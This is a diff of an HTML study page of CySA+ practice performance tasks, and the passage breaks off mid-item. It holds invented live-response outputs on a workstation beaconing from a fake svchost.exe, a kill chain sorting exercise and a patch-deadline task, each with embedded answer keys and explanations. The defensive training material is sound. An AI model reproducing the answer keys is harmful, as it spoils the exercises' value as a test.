@@ -9,13 +9,17 @@
 <title>CySA+ Performance Tasks</title>
 </head>
 <body>
+<meta name="claude:viewport-fit-sides" content="cover">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@400;500;600;700&display=swap">
 <style>
+/* Layout: task picker on top; each task is a two-pane exam view, evidence tabs
+   left (sticky on wide screens) and the scored questions right; stacks on phones. */
 :root{
   --bg:#f6f5f2; --surface:#ffffff; --surface-2:#eef1f2; --border:#dbe0e3;
   --text:#171b1f; --text-muted:#5a6570;
-  --accent:#1f6f8b; --accent-ink:#ffffff;
+  --accent:#1f6f8b; --accent-ink:#ffffff; --accent-soft:#e3f0f4;
   --ok:#1f8a5c; --ok-bg:#e7f4ee; --bad:#b3433a; --bad-bg:#fbeae8;
+  --term-bg:#0f1a1f; --term-fg:#cfe3ea; --term-dim:#7f98a2; --term-accent:#7fd3ee;
   --shadow:0 1px 2px rgba(20,24,28,.06),0 4px 14px rgba(20,24,28,.06);
   --radius:16px;
   --font-display:'IBM Plex Mono',ui-monospace,SFMono-Regular,Menlo,monospace;
@@ -23,193 +27,538 @@
 }
 @media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
   --bg:#0d1216; --surface:#151c22; --surface-2:#1b242b; --border:#2b363e;
-  --text:#e7edf1; --text-muted:#93a2ac; --accent:#5ab6d4; --accent-ink:#06262a;
+  --text:#e7edf1; --text-muted:#93a2ac; --accent:#5ab6d4; --accent-ink:#06262a; --accent-soft:#16303a;
   --ok:#55d69a; --ok-bg:#12291f; --bad:#f0948b; --bad-bg:#331a18;
+  --term-bg:#081014; --term-fg:#cfe3ea; --term-dim:#6f8892; --term-accent:#7fd3ee;
   --shadow:0 1px 2px rgba(0,0,0,.4),0 10px 26px rgba(0,0,0,.35); color-scheme:dark;}}
 :root[data-theme="dark"]{
   --bg:#0d1216; --surface:#151c22; --surface-2:#1b242b; --border:#2b363e;
-  --text:#e7edf1; --text-muted:#93a2ac; --accent:#5ab6d4; --accent-ink:#06262a;
+  --text:#e7edf1; --text-muted:#93a2ac; --accent:#5ab6d4; --accent-ink:#06262a; --accent-soft:#16303a;
   --ok:#55d69a; --ok-bg:#12291f; --bad:#f0948b; --bad-bg:#331a18;
+  --term-bg:#081014; --term-fg:#cfe3ea; --term-dim:#6f8892; --term-accent:#7fd3ee;
   --shadow:0 1px 2px rgba(0,0,0,.4),0 10px 26px rgba(0,0,0,.35); color-scheme:dark;}
 
 *{box-sizing:border-box;}
 body{background:var(--bg);color:var(--text);font-family:var(--font-body);margin:0;
   font-size:16px;line-height:1.55;}
-.wrap{max-width:780px;margin:0 auto;padding-inline:16px;padding-block:22px 60px;}
-h1,h2{font-family:var(--font-display);font-weight:600;letter-spacing:-.01em;margin:0;text-wrap:balance;}
+.wrap{max-width:1240px;margin:0 auto;padding-left:max(16px,env(safe-area-inset-left,0px));
+  padding-right:max(16px,env(safe-area-inset-right,0px));padding-block:22px 60px;}
+h1,h2,h3{font-family:var(--font-display);font-weight:600;letter-spacing:-.01em;margin:0;text-wrap:balance;}
 h1{font-size:clamp(25px,5.4vw,32px);line-height:1.14;margin-bottom:8px;}
-h2{font-size:17px;margin:0 0 10px;}
+h2{font-size:clamp(19px,3.4vw,23px);line-height:1.2;}
 p{margin:0 0 12px;}
 a{color:var(--accent);}
+code{font-family:var(--font-display);font-size:.9em;}
 .backlink{font-family:var(--font-display);font-size:11.5px;color:var(--text-muted);
   text-decoration:none;display:inline-block;margin-bottom:12px;padding:3px 9px;
   border:1px solid var(--border);border-radius:999px;background:var(--surface);}
 .backlink:hover{color:var(--accent);border-color:var(--accent);}
 .eyebrow{font-family:var(--font-display);font-size:11.5px;letter-spacing:.07em;
   text-transform:uppercase;color:var(--accent);margin:0 0 7px;}
-.lede{color:var(--text-muted);font-size:15px;max-width:62ch;}
+.lede{color:var(--text-muted);font-size:15px;max-width:68ch;}
+.label{font-family:var(--font-display);font-size:11px;letter-spacing:.07em;
+  text-transform:uppercase;color:var(--text-muted);margin:0 0 8px;}
 
-.card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);
-  padding:20px 22px;box-shadow:var(--shadow);margin-top:18px;}
+/* objective accuracy */
+.acc{display:flex;flex-wrap:wrap;gap:6px;margin:6px 0 0;}
+.acc .chip{font-family:var(--font-display);font-size:11.5px;padding:4px 10px;border-radius:999px;
+  border:1px solid var(--border);background:var(--surface);font-variant-numeric:tabular-nums;}
+.acc .chip b{font-weight:600;}
+.acc .none{font-size:13.5px;color:var(--text-muted);}
+
+/* picker */
+.picker{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:8px;margin:20px 0 4px;}
+.pick{display:flex;flex-direction:column;gap:6px;text-align:left;cursor:pointer;
+  border:1px solid var(--border);background:var(--surface);color:var(--text);
+  border-radius:12px;padding:10px 12px;font:inherit;}
+.pick:hover{border-color:var(--accent);}
+.pick[aria-current="true"]{border-color:var(--accent);background:var(--accent-soft);
+  box-shadow:inset 0 0 0 1px var(--accent);}
+.pick .pt{font-size:14px;font-weight:600;line-height:1.3;}
+.pick .pm{display:flex;justify-content:space-between;gap:8px;align-items:center;
+  font-family:var(--font-display);font-size:11px;color:var(--text-muted);font-variant-numeric:tabular-nums;}
+.pick .done{color:var(--ok);}
+
+/* task */
+.task{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);
+  box-shadow:var(--shadow);margin-top:18px;padding:20px clamp(14px,2.4vw,24px) 22px;}
+.thead{display:flex;flex-wrap:wrap;gap:8px 12px;align-items:baseline;justify-content:space-between;margin-bottom:12px;}
+.tags{display:flex;flex-wrap:wrap;gap:5px;}
 .tag{font-family:var(--font-display);font-size:10.5px;letter-spacing:.05em;text-transform:uppercase;
-  background:var(--surface-2);color:var(--text-muted);border-radius:999px;padding:2px 9px;}
+  background:var(--surface-2);color:var(--text-muted);border-radius:999px;padding:2px 9px;white-space:nowrap;}
 .scenario{background:var(--surface-2);border-left:3px solid var(--accent);
-  border-radius:0 10px 10px 0;padding:13px 15px;margin:0 0 14px;font-size:15px;}
-.task{font-size:14.5px;color:var(--text-muted);margin-bottom:4px;}
-.steplabel{font-family:var(--font-display);font-size:11.5px;letter-spacing:.06em;
-  text-transform:uppercase;color:var(--text-muted);margin:22px 0 8px;}
+  border-radius:0 10px 10px 0;padding:12px 15px;margin:0 0 10px;font-size:15px;max-width:90ch;}
+.instr{font-size:14.5px;color:var(--text-muted);max-width:90ch;margin-bottom:16px;}
+.split{display:grid;grid-template-columns:minmax(0,1fr);gap:18px;}
+@media (min-width:980px){
+  .split.two{grid-template-columns:minmax(0,1.12fr) minmax(0,1fr);align-items:start;}
+  .split.two .evpane{position:sticky;top:12px;max-height:calc(100vh - 24px);display:flex;flex-direction:column;}
+  .split.two .evbody{overflow:auto;min-height:0;}
+}
 
+/* evidence */
+.evpane{border:1px solid var(--border);border-radius:12px;background:var(--bg);min-width:0;}
+.tabs{display:flex;flex-wrap:wrap;gap:4px;padding:8px 8px 0;border-bottom:1px solid var(--border);}
+.tab{font-family:var(--font-display);font-size:12px;padding:7px 11px;border:1px solid transparent;
+  border-bottom:none;border-radius:8px 8px 0 0;background:transparent;color:var(--text-muted);cursor:pointer;
+  margin-bottom:-1px;}
+.tab:hover{color:var(--accent);}
+.tab[aria-selected="true"]{background:var(--surface);color:var(--text);border-color:var(--border);}
+.evbody{padding:12px;min-width:0;}
+.cmd{font-family:var(--font-display);font-size:12px;color:var(--text-muted);margin:0 0 6px;word-break:break-all;}
+pre.out{font-family:var(--font-display);font-size:12px;line-height:1.5;margin:0;padding:12px;
+  background:var(--surface);border:1px solid var(--border);border-radius:8px;overflow-x:auto;
+  white-space:pre;color:var(--text);}
+.tblwrap{overflow-x:auto;border:1px solid var(--border);border-radius:8px;background:var(--surface);}
+table.ev{border-collapse:collapse;width:100%;font-size:13px;}
+table.ev th,table.ev td{padding:6px 10px;border-bottom:1px solid var(--border);text-align:left;vertical-align:top;}
+table.ev th{font-family:var(--font-display);font-size:10.5px;letter-spacing:.05em;text-transform:uppercase;
+  color:var(--text-muted);background:var(--surface-2);white-space:nowrap;}
+table.ev tr:last-child td{border-bottom:none;}
+table.ev.mono td{font-family:var(--font-display);font-size:11.5px;overflow-wrap:anywhere;min-width:4.5ch;}
+.cap{font-size:12.5px;color:var(--text-muted);margin:0 0 6px;}
+.doc{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:12px 14px;}
+.doc dl{display:grid;grid-template-columns:max-content minmax(0,1fr);gap:4px 12px;margin:0 0 12px;
+  font-size:13px;padding-bottom:10px;border-bottom:1px solid var(--border);}
+.doc dt{font-family:var(--font-display);font-size:11px;color:var(--text-muted);padding-top:2px;}
+.doc dd{margin:0;overflow-wrap:anywhere;}
+.doc p{font-size:14.5px;}
+.doc p:last-child{margin-bottom:0;}
+
+/* console */
+.term{background:var(--term-bg);color:var(--term-fg);border-radius:8px;font-family:var(--font-display);
+  font-size:12px;line-height:1.5;display:flex;flex-direction:column;min-height:300px;}
+.term .scroll{padding:12px 12px 4px;overflow:auto;max-height:440px;flex:1;}
+.term pre{margin:0;white-space:pre;font:inherit;color:inherit;}
+.term .dim{color:var(--term-dim);}
+.term .ps{color:var(--term-accent);}
+.term form{display:flex;gap:8px;align-items:center;padding:8px 12px 12px;}
+.term input{flex:1;min-width:0;background:transparent;border:none;color:var(--term-fg);
+  font:inherit;outline:none;padding:4px 0;caret-color:var(--term-accent);}
+.term:focus-within{box-shadow:0 0 0 2px var(--accent);}
+
+/* questions */
+.qpane{display:flex;flex-direction:column;gap:12px;min-width:0;}
+.q{border:1px solid var(--border);border-radius:12px;padding:12px 14px;background:var(--bg);}
+.q.right{background:var(--ok-bg);border-color:var(--ok);}
+.q.wrong{background:var(--bad-bg);border-color:var(--bad);}
+.q.mixed{border-color:var(--bad);}
+.qp{font-size:15px;font-weight:500;margin:0 0 9px;}
+.q select,.q input[type=text]{font-family:var(--font-body);font-size:14px;padding:7px 10px;width:100%;
+  border:1px solid var(--border);border-radius:10px;background:var(--surface);color:var(--text);}
+.q input[type=text]{font-family:var(--font-display);font-size:13.5px;}
+.opts{display:flex;flex-direction:column;gap:6px;}
+.opt{display:flex;gap:9px;align-items:flex-start;font-size:14.5px;cursor:pointer;
+  padding:6px 8px;border-radius:8px;border:1px solid var(--border);background:var(--surface);}
+.opt input{margin-top:4px;accent-color:var(--accent);}
+.opt.key{border-color:var(--ok);}
+.gridwrap{overflow-x:auto;}
+table.grid{border-collapse:collapse;width:100%;font-size:13.5px;}
+table.grid th,table.grid td{padding:7px 8px;border-bottom:1px solid var(--border);text-align:center;}
+table.grid th{font-family:var(--font-display);font-size:10.5px;letter-spacing:.04em;text-transform:uppercase;
+  color:var(--text-muted);font-weight:500;}
+table.grid td:first-child,table.grid th:first-child{text-align:left;font-family:var(--font-display);font-size:12.5px;}
+table.grid input{width:18px;height:18px;accent-color:var(--accent);}
+table.grid tr.right td{background:var(--ok-bg);}
+table.grid tr.wrong td{background:var(--bad-bg);}
+.keymark{font-family:var(--font-display);font-size:10.5px;color:var(--ok);display:block;}
 ol.stages{list-style:none;counter-reset:s;margin:0;padding:0;}
 ol.stages li{counter-increment:s;display:flex;align-items:center;gap:10px;
-  border:1px solid var(--border);border-radius:10px;background:var(--bg);
-  padding:8px 10px;margin-bottom:6px;}
+  border:1px solid var(--border);border-radius:10px;background:var(--surface);
+  padding:7px 10px;margin-bottom:6px;}
 ol.stages li::before{content:counter(s);font-family:var(--font-display);font-size:12px;
   color:var(--text-muted);width:18px;flex:0 0 18px;text-align:right;}
-.sname{flex:1;min-width:0;font-size:15px;}
+ol.stages li.right{background:var(--ok-bg);border-color:var(--ok);}
+ol.stages li.wrong{background:var(--bad-bg);border-color:var(--bad);}
+.sname{flex:1;min-width:0;font-size:14.5px;}
 .move{font-family:var(--font-display);font-size:12px;line-height:1;padding:5px 8px;
   border:1px solid var(--border);border-radius:8px;background:var(--surface);
   color:var(--text-muted);cursor:pointer;}
 .move:hover:not(:disabled){border-color:var(--accent);color:var(--accent);}
 .move:disabled{opacity:.35;cursor:default;}
-li.right{background:var(--ok-bg);border-color:var(--ok);}
-li.wrong{background:var(--bad-bg);border-color:var(--bad);}
+.mitem{border:1px solid var(--border);border-radius:10px;padding:9px 11px;margin-bottom:8px;background:var(--surface);}
+.mitem:last-child{margin-bottom:0;}
+.mitem p{margin:0 0 7px;font-size:14.5px;}
+.mitem.right{background:var(--ok-bg);border-color:var(--ok);}
+.mitem.wrong{background:var(--bad-bg);border-color:var(--bad);}
+.mitem .mt{font-family:var(--font-display);font-size:13px;font-weight:600;}
+.why{font-size:14px;line-height:1.55;margin-top:9px;padding-top:9px;border-top:1px solid var(--border);}
+.why b{font-family:var(--font-display);font-size:11px;letter-spacing:.05em;text-transform:uppercase;
+  color:var(--text-muted);display:block;margin-bottom:3px;}
+.rowwhy{font-size:13.5px;margin:6px 0 0;}
+.rowwhy b{font-family:var(--font-display);font-size:12px;}
 
-.ev{border:1px solid var(--border);border-radius:12px;padding:12px 14px;margin-bottom:10px;
-  background:var(--bg);}
-.ev p{margin:0 0 9px;font-size:15px;}
-.ev select{font-family:var(--font-body);font-size:14px;padding:7px 10px;width:100%;
-  border:1px solid var(--border);border-radius:10px;background:var(--surface);color:var(--text);}
-.ev.right{background:var(--ok-bg);border-color:var(--ok);}
-.ev.wrong{background:var(--bad-bg);border-color:var(--bad);}
-.why{font-size:14px;line-height:1.55;margin-top:9px;padding-top:9px;
-  border-top:1px solid var(--border);color:var(--text);}
-.why b{font-family:var(--font-display);font-size:11px;letter-spacing:.05em;
-  text-transform:uppercase;color:var(--text-muted);display:block;margin-bottom:3px;}
-
-.btnrow{display:flex;gap:8px;flex-wrap:wrap;margin-top:18px;}
+.btnrow{display:flex;gap:8px;flex-wrap:wrap;align-items:center;}
 .btn{font-family:var(--font-display);font-size:12.5px;padding:9px 15px;border-radius:10px;
   cursor:pointer;border:1px solid var(--border);background:var(--surface);color:var(--text);}
 .btn:hover{border-color:var(--accent);color:var(--accent);}
 .btn.primary{background:var(--accent);color:var(--accent-ink);border-color:var(--accent);}
-.btn:focus-visible,.move:focus-visible,select:focus-visible{outline:2px solid var(--accent);outline-offset:2px;}
-.score{font-family:var(--font-display);font-size:13px;margin-top:14px;padding:11px 13px;
-  border-radius:12px;background:var(--surface-2);color:var(--text);}
+.btn.primary:hover{color:var(--accent-ink);filter:brightness(1.08);}
+.btn:focus-visible,.move:focus-visible,.tab:focus-visible,.pick:focus-visible,select:focus-visible,
+input:focus-visible{outline:2px solid var(--accent);outline-offset:2px;}
+.score{font-family:var(--font-display);font-size:13px;padding:10px 13px;border-radius:12px;
+  background:var(--surface-2);font-variant-numeric:tabular-nums;}
+.unans{font-size:13px;color:var(--bad);}
 .note{border-left:3px solid var(--border);background:var(--surface-2);border-radius:0 10px 10px 0;
-  padding:12px 14px;font-size:13.5px;color:var(--text-muted);line-height:1.55;margin-top:22px;}
-.foot{margin-top:22px;padding-top:14px;border-top:1px solid var(--border);
-  font-size:12px;color:var(--text-muted);}
+  padding:12px 14px;font-size:13.5px;color:var(--text-muted);line-height:1.55;margin-top:22px;max-width:90ch;}
+.foot{margin-top:22px;padding-top:14px;border-top:1px solid var(--border);font-size:12px;color:var(--text-muted);}
+@media (prefers-reduced-motion:no-preference){.pick,.btn,.tab{transition:border-color .12s,background-color .12s,color .12s;}}
 </style>
 
 <div class="wrap">
   <a class="backlink" href="index.html">&larr; CySA+ toolkit</a>
   <p class="eyebrow">CompTIA CySA+ &middot; CS0-003</p>
   <h1>Performance Tasks</h1>
-  <p class="lede">Hands-on exercises in the shape the exam uses &mdash; sequence it, attribute it, then read why. Scored per objective, like the Drill.</p>
-  <div class="card">
-    <h2>Kill Chain Reconstruction <span class="tag">Objective 3.1</span></h2>
-    <div id="pbq-killchain"></div>
-  </div>
-  <div class="note">Progress saves in this browser under <code>cysa:pbq:v1</code>, with per-objective accuracy recorded the same way the Drill records it.</div>
-  <div class="foot">Original study material written against CompTIA's published CS0-003 objectives. Not official CompTIA content, and not affiliated with, authorized by or endorsed by CompTIA.</div>
+  <p class="lede">10 hands-on exercises in the shapes the exam uses: read the evidence, run the console, decide, then read why. Every field is scored against its own objective.</p>
+  <p class="label" style="margin-top:14px">Your accuracy by objective</p>
+  <div class="acc" id="acc"></div>
+  <nav class="picker" id="picker" aria-label="Tasks"></nav>
+  <article class="task" id="task"></article>
+  <div class="note">Progress saves in this browser under <code>cysa:pbq:v1</code>. Use this one copy of the page for all your practice, so your scores stay in one place.</div>
+  <div class="foot">Original study material written against CompTIA's published CS0-003 objectives. Scenarios, logs and addresses are invented; external addresses use documentation ranges. Not official CompTIA content, and not affiliated with, authorized by or endorsed by CompTIA.</div>
 </div>
 
 <script>
-var PBQS = [{"id": "killchain","obj": "3.1","title": "Kill Chain Reconstruction","scenario": "You are handed a finished timeline from an intrusion at a mid-size engineering firm. Seven artifacts survived in the logs. The incident lead wants them placed on the Lockheed Martin Cyber Kill Chain before the report goes out, because the remediation owner for each stage is different.","task": "Put the seven kill chain stages in order, then attribute each artifact to the stage it belongs to. Two of them are commonly placed one stage too early or too late — the distinction is what the stage actually describes, not when you first noticed it.","order": ["Reconnaissance","Weaponization","Delivery","Exploitation","Installation","Command and Control","Actions on Objectives"],"ev": [{"t": "Three weeks before anything else, a single external address walks the company's public staff directory and pulls every name and job title.","s": "Reconnaissance","w": "Reconnaissance is information gathering about the target, and it leaves no foothold behind. The giveaway is that nothing is delivered and nothing runs — the attacker is only learning who exists and what they do, which is what makes the later email convincing."},{"t": "A macro-enabled spreadsheet is assembled on the attacker's own infrastructure, pairing a loader with a finance-themed document.","s": "Weaponization","w": "Weaponization happens entirely on the attacker's side and never touches the victim — which is exactly why it is the stage defenders have no telemetry for. Coupling a payload to a deliverable artifact is the whole definition. If you placed Delivery here, ask whether the victim has seen it yet; they have not."},{"t": "That spreadsheet arrives as an attachment addressed to three named accounts-payable staff, using their correct job titles.","s": "Delivery","w": "Delivery is the transmission of the weapon to the target — email, web, removable media. Note it uses the titles harvested during reconnaissance, which is how the two stages connect. The email itself is delivery even though phishing is often loosely described as the whole attack."},{"t": "One recipient opens the file; the macro executes and spawns a PowerShell process from the Office application.","s": "Exploitation","w": "Exploitation is the moment the weapon fires — a vulnerability triggering, or a user being induced to run something. Office spawning PowerShell is the classic parent-child anomaly that marks it. Nothing persistent exists yet; kill the process now and the intrusion ends."},{"t": "A scheduled task is registered that relaunches the loader every time the user signs in.","s": "Installation","w": "Installation is persistence — the attacker arranging to survive a reboot or a logoff. This is the stage most often confused with Exploitation. The test is simple: exploitation got code running once, installation makes it come back."},{"t": "The host begins reaching an external address every sixty seconds over HTTPS, each request under a kilobyte.","s": "Command and Control","w": "Command and control is the channel back to the operator. Small, regular, low-volume outbound traffic is beaconing — the host asking for instructions. Until this works the attacker has code on a machine they cannot steer."},{"t": "The finance share is archived into a single file, split, and uploaded over the same channel.","s": "Actions on Objectives","w": "Actions on objectives is the attacker finally doing the thing they came for — here, exfiltration. Collection and staging belong to this stage too. Everything before it was setup; this is the loss."}]}];
+var PBQS = [{"id":"live-response","obj":"1.3","objs":["1.3","3.2"],"pts":6,"title":"Live Response on a Finance Workstation","sc":"EDR raised a medium-severity alert on FIN-WS14 (10.20.4.57), a finance workstation used by M. Lopez: repeated outbound connections to an address nobody recognizes. You opened a live-response session and collected four outputs. The console dropped the command line from the first two.","task":"Work out which command produced Outputs 1 and 2, trace the suspicious connection to a process and a file on disk, and choose the next step.","ev":[{"k":"log","l":"Output 1","c":"","b":"Active Connections\n\n  Proto  Local Address          Foreign Address        State           PID\n  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       1012\n  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4\n  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1288\n  TCP    10.20.4.57:139         0.0.0.0:0              LISTENING       4\n  TCP    10.20.4.57:50211       198.51.100.10:443      ESTABLISHED     4108\n  TCP    10.20.4.57:50340       198.51.100.45:443      ESTABLISHED     4388\n  TCP    10.20.4.57:50341       198.51.100.45:443      TIME_WAIT       0\n  TCP    10.20.4.57:51544       203.0.113.77:8443      ESTABLISHED     6120\n  TCP    10.20.4.57:51561       203.0.113.77:8443      SYN_SENT        6120\n  UDP    0.0.0.0:5353           *:*                                    1012"},{"k":"log","l":"Output 2","c":"","b":"Windows IP Configuration\n\n    outlook.office365.com\n    ----------------------------------------\n    Record Name . . . . . : outlook.office365.com\n    Record Type . . . . . : 1\n    Time To Live  . . . . : 142\n    Data Length . . . . . : 4\n    Section . . . . . . . : Answer\n    A (Host) Record . . . : 198.51.100.10\n\n    intranet.harborline.example\n    ----------------------------------------\n    Record Name . . . . . : intranet.harborline.example\n    Record Type . . . . . : 1\n    Time To Live  . . . . : 2961\n    Data Length . . . . . : 4\n    Section . . . . . . . : Answer\n    A (Host) Record . . . : 198.51.100.45\n\n    cdn-update-sync.net\n    ----------------------------------------\n    Record Name . . . . . : cdn-update-sync.net\n    Record Type . . . . . : 1\n    Time To Live  . . . . : 58\n    Data Length . . . . . : 4\n    Section . . . . . . . : Answer\n    A (Host) Record . . . : 203.0.113.77"},{"k":"log","l":"Output 3","c":"C:\\&gt; tasklist /svc","b":"Image Name                     PID Services\n========================= ======== ============================================\nSystem Idle Process              0 N/A\nSystem                           4 N/A\nservices.exe                   712 N/A\nsvchost.exe                    904 BrokerInfrastructure, DcomLaunch, PlugPlay,\n                                   Power\nsvchost.exe                   1012 RpcEptMapper, RpcSs\nsvchost.exe                   1288 TermService\nexplorer.exe                  3312 N/A\nOUTLOOK.EXE                   4108 N/A\nchrome.exe                    4388 N/A\nWINWORD.EXE                   5528 N/A\nsvchost.exe                   6120 N/A"},{"k":"log","l":"Output 4","c":"C:\\&gt; wmic process get ExecutablePath,ParentProcessId,ProcessId","b":"ExecutablePath                                                ParentProcessId  ProcessId\nC:\\Windows\\system32\\services.exe                               664              712\nC:\\Windows\\system32\\svchost.exe                                712              904\nC:\\Windows\\system32\\svchost.exe                                712              1012\nC:\\Windows\\system32\\svchost.exe                                712              1288\nC:\\Windows\\Explorer.EXE                                         3260             3312\nC:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE    3312             4108\nC:\\Program Files\\Google\\Chrome\\Application\\chrome.exe          3312             4388\nC:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE    4108             5528\nC:\\Users\\mlopez\\AppData\\Roaming\\Microsoft\\svchost.exe          5528             6120"}],"q":[{"k":"select","o":"1.3","p":"Which command produced Output 1?","opt":["netstat -ano","netstat -r","arp -a","nbtstat -n"],"a":0,"fx":false,"w":"Protocol, local and foreign address, state and a PID column is the signature of netstat with -a (all connections and listeners), -n (numeric, no name lookups) and -o (owning PID). netstat -r prints the routing table, arp -a maps IP addresses to MAC addresses, and nbtstat shows NetBIOS names. The PID column is what lets you pivot to a process."},{"k":"select","o":"1.3","p":"Which command produced Output 2?","opt":["ipconfig /displaydns","nslookup cdn-update-sync.net","ipconfig /all","Get-DnsClientServerAddress"],"a":0,"fx":false,"w":"Repeated Record Name / Record Type / Time To Live blocks are the local resolver cache, which ipconfig /displaydns dumps. nslookup queries one name and opens with the server it asked. ipconfig /all shows adapter settings, and Get-DnsClientServerAddress lists configured DNS servers, not cached answers. The cache is what ties 203.0.113.77 back to a domain name you can block and hunt for."},{"k":"text","o":"1.3","p":"What is the PID of the process talking to the suspicious address?","a":["6120"],"ph":"PID","w":"Both connections to 203.0.113.77:8443 in Output 1 belong to PID 6120. The short TTL on the cached record (58 seconds) fits infrastructure that changes addresses often, which is worth noting in the ticket.","show":"6120"},{"k":"select","o":"1.3","p":"Which file is responsible for the malicious behavior?","opt":["C:\\Users\\mlopez\\AppData\\Roaming\\Microsoft\\svchost.exe","C:\\Windows\\system32\\svchost.exe","C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"],"a":0,"fx":false,"w":"PID 6120 resolves in Output 4 to an svchost.exe under the user&#x27;s Roaming profile. The genuine svchost.exe only ever runs from System32. WINWORD.EXE is the parent that launched it, which makes Word part of the story (likely the delivery vehicle), but Word is not the file doing the beaconing."},{"k":"select","o":"1.3","p":"Which observation is the strongest indicator that PID 6120 is malicious?","opt":["It is named svchost.exe, hosts no services, runs from a user profile, and its parent is Word","It holds an established HTTPS-style connection to the internet","It uses high-numbered local ports such as 51544","It appears in tasklist alongside other svchost.exe instances"],"a":0,"fx":false,"w":"Real svchost.exe is started by services.exe (PID 712 here) and always hosts at least one service; tasklist /svc shows N/A for 6120. A system binary name in the wrong path with the wrong parent is masquerading. Outbound HTTPS and ephemeral local ports are normal for almost every process, so on their own they prove nothing."},{"k":"select","o":"3.2","p":"What should you do next?","opt":["Network-contain the host through EDR, then capture memory before killing the process","Kill PID 6120, delete the file and reboot the workstation","Block 203.0.113.77 at the firewall and close the alert","Reimage FIN-WS14 immediately from the standard build"],"a":0,"fx":false,"w":"Containment stops the beaconing without destroying evidence. Memory is the most volatile source and holds what the process decrypted, injected and connected to, so it is captured before the process dies. Killing and deleting first loses that. Blocking one IP misses the next address the domain resolves to, and reimaging erases the scope you still need: how it arrived through Word, and whether other hosts received it."}]},{"id":"killchain","obj":"3.1","objs":["3.1"],"pts":14,"title":"Kill Chain Reconstruction","sc":"You are handed a finished timeline from an intrusion at a mid-size engineering firm. Seven artifacts survived in the logs. The incident lead wants them placed on the Lockheed Martin Cyber Kill Chain before the report goes out, because the remediation owner for each stage is different.","task":"Put the seven kill chain stages in order, then attribute each artifact to the stage it belongs to. Two of them are commonly placed one stage too early or too late — the distinction is what the stage actually describes, not when you first noticed it.","ev":[],"q":[{"k":"order","o":"3.1","p":"Step 1 — sequence the stages","it":["Reconnaissance","Weaponization","Delivery","Exploitation","Installation","Command and Control","Actions on Objectives"],"w":"Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command and Control, Actions on Objectives. Each stage depends on the one before it: the weapon cannot be delivered before it is built, and nothing persists before it first runs."},{"k":"match","o":"3.1","p":"Step 2 — attribute each artifact","ch":["Reconnaissance","Weaponization","Delivery","Exploitation","Installation","Command and Control","Actions on Objectives"],"it":[{"t":"Three weeks before anything else, a single external address walks the company&#x27;s public staff directory and pulls every name and job title.","a":0,"w":"Reconnaissance is information gathering about the target, and it leaves no foothold behind. The giveaway is that nothing is delivered and nothing runs — the attacker is only learning who exists and what they do, which is what makes the later email convincing."},{"t":"A macro-enabled spreadsheet is assembled on the attacker&#x27;s own infrastructure, pairing a loader with a finance-themed document.","a":1,"w":"Weaponization happens entirely on the attacker&#x27;s side and never touches the victim — which is exactly why it is the stage defenders have no telemetry for. Coupling a payload to a deliverable artifact is the whole definition. If you placed Delivery here, ask whether the victim has seen it yet; they have not."},{"t":"That spreadsheet arrives as an attachment addressed to three named accounts-payable staff, using their correct job titles.","a":2,"w":"Delivery is the transmission of the weapon to the target — email, web, removable media. Note it uses the titles harvested during reconnaissance, which is how the two stages connect. The email itself is delivery even though phishing is often loosely described as the whole attack."},{"t":"One recipient opens the file; the macro executes and spawns a PowerShell process from the Office application.","a":3,"w":"Exploitation is the moment the weapon fires — a vulnerability triggering, or a user being induced to run something. Office spawning PowerShell is the classic parent-child anomaly that marks it. Nothing persistent exists yet; kill the process now and the intrusion ends."},{"t":"A scheduled task is registered that relaunches the loader every time the user signs in.","a":4,"w":"Installation is persistence — the attacker arranging to survive a reboot or a logoff. This is the stage most often confused with Exploitation. The test is simple: exploitation got code running once, installation makes it come back."},{"t":"The host begins reaching an external address every sixty seconds over HTTPS, each request under a kilobyte.","a":5,"w":"Command and control is the channel back to the operator. Small, regular, low-volume outbound traffic is beaconing — the host asking for instructions. Until this works the attacker has code on a machine they cannot steer."},{"t":"The finance share is archived into a single file, split, and uploaded over the same channel.","a":6,"w":"Actions on objectives is the attacker finally doing the thing they came for — here, exfiltration. Collection and staging belong to this stage too. Everything before it was setup; this is the loss."}],"sh":true}]},{"id":"patch-window","obj":"2.5","objs":["2.3","2.5"],"pts":9,"title":"Remediation Deadlines","sc":"Harborline Freight&#x27;s weekly authenticated scan finished overnight. The vulnerability management standard sets deadlines by severity and by where the asset sits. The change board meets this afternoon and wants each finding&#x27;s deadline and a plan for the one that has no patch.","task":"Use the remediation standard and the environment map to set a deadline for each finding, then answer the planning questions.","ev":[{"k":"table","l":"Standard","cap":"Remediation deadlines (calendar days from detection)","m":false,"h":["Severity","CVSS v3.1 base","Production","Non-production"],"r":[["Critical","9.0 – 10.0","7","21"],["High","7.0 – 8.9","14","30"],["Medium","4.0 – 6.9","30","60"],["Low","0.1 – 3.9","90","90"]]},{"k":"doc","l":"Rules","f":[],"p":["Internet-facing production assets: halve the production deadline, rounding down to a whole day.","A finding is closed only when a follow-up scan no longer reports it. A change ticket or a patch tool showing &quot;installed&quot; does not close it.","Where no vendor fix exists, a compensating control must be in place within the same deadline, and a risk exception must be filed with the CISO and reviewed every 90 days."]},{"k":"table","l":"Environments","cap":"","m":false,"h":["Environment","Subnet","Tier","Internet-facing"],"r":[["prod-edge","172.16.10.0/24","Production","Yes"],["prod-core","172.16.20.0/24","Production","No"],["staging","172.16.30.0/24","Non-production","No"],["dev","172.16.40.0/24","Non-production","No"]]},{"k":"log","l":"Scan results","c":"","b":"F1  172.16.10.15   TLS Version 1.0 Protocol Detection\n    Severity: Medium   CVSS v3.1: 5.3\n    Solution: Disable TLS 1.0 and enable TLS 1.2 or later.\n\nF2  172.16.20.31   Microsoft SQL Server Unsupported Version Detection\n    Severity: High     CVSS v3.1: 7.5\n    Solution: Upgrade to a 